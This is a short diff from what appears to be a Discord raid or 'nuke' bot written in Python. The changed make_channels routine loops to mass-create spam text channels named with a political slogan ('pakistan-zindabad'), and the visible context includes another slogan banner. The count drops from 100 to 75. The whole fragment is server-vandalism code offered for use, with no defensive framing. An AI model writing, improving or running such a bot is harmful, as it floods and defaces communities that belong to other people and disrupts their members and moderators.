@@ -73,9 +73,9 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
         print(')\n')
 
     async def make_channels(self, ctx):
-        for i in range(100):
+        for i in range(75):
             try:
-                await ctx.guild.create_text_channel(f"pakistan-zindabad-{i}")
+                await ctx.guild.create_text_channel(f"pakistan-zindabad-{i+1}")
             except:
                 print(f"Created ( {i} channels )")
 
